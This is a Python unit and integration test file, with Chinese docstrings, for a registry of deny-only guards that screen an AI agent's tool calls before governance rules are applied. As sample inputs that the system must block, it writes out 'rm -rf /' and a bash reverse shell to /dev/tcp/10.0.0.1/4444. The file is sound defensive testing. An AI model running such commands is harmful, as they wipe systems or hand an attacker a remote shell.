"""单调守卫（Monotonic Guard）单元与集成测试。

设计契约（对齐 DeepSeek Harness 的 guards 语义，见 docs/TDD 备注）：
- 守卫只允许返回 DENY 或 ABSTAIN；契约上不存在 ALLOW ——
  "放行"由"没有任何守卫拒绝"推导，杜绝放行式检查成为最弱环节。
- 守卫自身异常 → fail-closed 视为 DENY（与治理 fail-closed 纪律一致）。
- 注册可逆：register() 返回 disposer，调用后守卫不再参与判定；disposer 幂等。
- 注册表为空时 check_all() 恒返回 None —— 与未接入前行为完全等价。
"""

import threading
import unittest
from dataclasses import dataclass

from neurova.security.monotonic_guard import (
    GuardOutcome,
    GuardVerdict,
    MonotonicGuardRegistry,
    get_monotonic_guards,
    reset_monotonic_guards,
)
from neurova.security.governance import (
    GovernanceDecision,
    GovernancePolicy,
    reset_governance,
)


@dataclass
class FakeGuard:
    """测试守卫：由 rule_id + 行为函数构成。"""

    rule_id: str
    behavior: object  # Callable[[tool_name, params, user_id], GuardVerdict]

    def check(self, tool_name: str, params, user_id=None):
        return self.behavior(tool_name, params, user_id)


def _always_deny(tool_name, params, user_id):
    return GuardVerdict.DENY


def _always_abstain(tool_name, params, user_id):
    return GuardVerdict.ABSTAIN


class TestMonotonicGuardRegistry(unittest.TestCase):
    """注册表机制：空集等价、deny/abstain 语义、短路、异常、可逆、作用域。"""

    def setUp(self):
        self.registry = MonotonicGuardRegistry()

    def test_empty_registry_always_abstains(self):
        """空注册表 -> None（与接入前行为完全等价）。"""
        self.assertIsNone(self.registry.check_all("shell", {"command": "ls"}))
        self.assertIsNone(self.registry.check_all("mcp.query", {"q": "x"}))

    def test_deny_returns_outcome_with_rule_id(self):
        self.registry.register(FakeGuard("block_rm", _always_deny))
        outcome = self.registry.check_all("shell", {"command": "rm -rf /"})
        self.assertIsInstance(outcome, GuardOutcome)
        self.assertEqual(outcome.rule_id, "block_rm")
        self.assertIn("block_rm", outcome.message)
        self.assertEqual(outcome.to_dict()["rule_id"], "block_rm")

    def test_abstain_guard_returns_none(self):
        self.registry.register(FakeGuard("observe", _always_abstain))
        self.assertIsNone(self.registry.check_all("shell", {"command": "ls"}))

    def test_multiple_guards_short_circuit_on_first_deny(self):
        calls = []
        first = FakeGuard("first", lambda *a: (calls.append(1), GuardVerdict.DENY)[1])
        second = FakeGuard("second", lambda *a: (calls.append(2), GuardVerdict.DENY)[1])
        self.registry.register(first)
        self.registry.register(second)
        outcome = self.registry.check_all("shell", {"command": "x"})
        self.assertEqual(outcome.rule_id, "first")
        self.assertEqual(calls, [1])  # 拒绝后短路，不继续咨询下游守卫

    def test_abstain_then_deny_still_denies(self):
        self.registry.register(FakeGuard("observe", _always_abstain))
        self.registry.register(FakeGuard("block_rm", _always_deny))
        outcome = self.registry.check_all("shell", {"command": "rm -rf /"})
        self.assertEqual(outcome.rule_id, "block_rm")

    def test_guard_exception_is_fail_closed_deny(self):
        """守卫异常 -> DENY（fail-closed），绝不放行。"""

        class ExplodingGuard:
            rule_id = "exploder"

            def check(self, tool_name, params, user_id=None):
                raise RuntimeError("boom")

        self.registry.register(ExplodingGuard())
        outcome = self.registry.check_all("shell", {"command": "ls"})
        self.assertEqual(outcome.rule_id, "exploder")
        self.assertIn("boom", outcome.message)
        self.assertIn("异常", outcome.message)

    def test_disposer_reverses_registration_and_is_idempotent(self):
        disposer = self.registry.register(FakeGuard("block_rm", _always_deny))
        self.assertIsNotNone(self.registry.check_all("shell", {"command": "rm -rf /"}))
        disposer()
        self.assertIsNone(self.registry.check_all("shell", {"command": "rm -rf /"}))
        disposer()  # 幂等：再次调用不抛异常

    def test_unregister_by_rule_id(self):
        self.registry.register(FakeGuard("block_rm", _always_deny))
        self.assertTrue(self.registry.unregister("block_rm"))
        self.assertFalse(self.registry.unregister("block_rm"))  # 不存在返回 False
        self.assertIsNone(self.registry.check_all("shell", {"command": "rm -rf /"}))

    def test_scope_filters_tool_names(self):
        """作用域=前缀匹配；不在作用域的守卫不参与判定。"""
        self.registry.register(FakeGuard("block_mcp", _always_deny), scope=("mcp.",))
        self.assertIsNotNone(self.registry.check_all("mcp.query", {}))
        # 注意：mcp.query 以 "mcp." 开头，但 "shell" 不开头 —— 不会被裁决
        self.assertIsNone(self.registry.check_all("shell", {"command": "rm -rf /"}))

    def test_clear_restores_equivalence(self):
        self.registry.register(FakeGuard("block_rm", _always_deny))
        self.registry.clear()
        self.assertIsNone(self.registry.check_all("shell", {"command": "rm -rf /"}))

    def test_registry_is_thread_safe(self):
        """并发注册/检查不抛异常（RLock 保护）。"""
        errors = []

        def worker(i):
            try:
                g = FakeGuard(f"g{i}", _always_abstain)
                self.registry.register(g)
                self.registry.check_all("shell", {})
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(8)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        self.assertEqual(errors, [])

    def test_list_guards_reflects_registry(self):
        self.registry.register(FakeGuard("a", _always_abstain))
        self.registry.register(FakeGuard("b", _always_abstain))
        ids = sorted(g.rule_id for g in self.registry.list_guards())
        self.assertEqual(ids, ["a", "b"])


class TestMonotonicGuardGovernanceIntegration(unittest.TestCase):
    """接入 GovernancePolicy.evaluate_tool_call 的集成行为。"""

    def setUp(self):
        reset_monotonic_guards()
        reset_governance()
        self.policy = GovernancePolicy()

    def tearDown(self):
        reset_monotonic_guards()
        reset_governance()

    def test_guard_deny_precedes_content_adjudication(self):
        """守卫在参数内容裁决之前生效：无可裁决参数也先被守卫拒绝。"""
        get_monotonic_guards().register(FakeGuard("block_shell", _always_deny))
        result = self.policy.evaluate_tool_call("shell", {"command": ""})
        self.assertEqual(result.decision, GovernanceDecision.DENY)
        self.assertIn("block_shell", "; ".join(result.reasons))

    def test_guard_deny_wins_over_sandbox_verdict(self):
        """守卫 DENY 优先于治理规则的 SANDBOX/ALLOW。"""
        get_monotonic_guards().register(FakeGuard("block_all", _always_deny))
        result = self.policy.evaluate_tool_call("shell", {"command": "grep foo file"})
        self.assertEqual(result.decision, GovernanceDecision.DENY)

    def test_no_guards_keeps_original_semantics(self):
        """无守卫注册时行为与既有语义完全一致（回归保护）。"""
        # 可裁决内容 -> 治理规则裁决（shell 注入类被拒）
        result = self.policy.evaluate_tool_call("shell", {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
        self.assertEqual(result.decision, GovernanceDecision.DENY)
        # 无可裁决内容 -> None（放行语义由上层推导，不在这里伪造）
        self.assertIsNone(self.policy.evaluate_tool_call("memory_search", {}))

    def test_guard_scope_respected_through_governance(self):
        """作用域守卫在治理入口同样按工具名过滤。"""
        get_monotonic_guards().register(FakeGuard("block_mcp", _always_deny), scope=("mcp.",))
        result = self.policy.evaluate_tool_call("mcp.query", {"url": "http://x"})
        self.assertEqual(result.decision, GovernanceDecision.DENY)
        self.assertIsNone(
            self.policy.evaluate_tool_call("memory_search", {"keyword": "x"})
        )

    def test_disposer_through_governance_restores_semantics(self):
        """可逆注册在治理入口同样生效：撤销后恢复原语义。"""
        disposer = get_monotonic_guards().register(FakeGuard("block_shell", _always_deny))
        self.assertEqual(
            self.policy.evaluate_tool_call("shell", {"command": "echo ok"}).decision,
            GovernanceDecision.DENY,
        )
        disposer()
        result = self.policy.evaluate_tool_call("shell", {"command": "echo ok"})
        self.assertIn(result.decision, (GovernanceDecision.ALLOW, GovernanceDecision.SANDBOX))


if __name__ == "__main__":
    unittest.main()
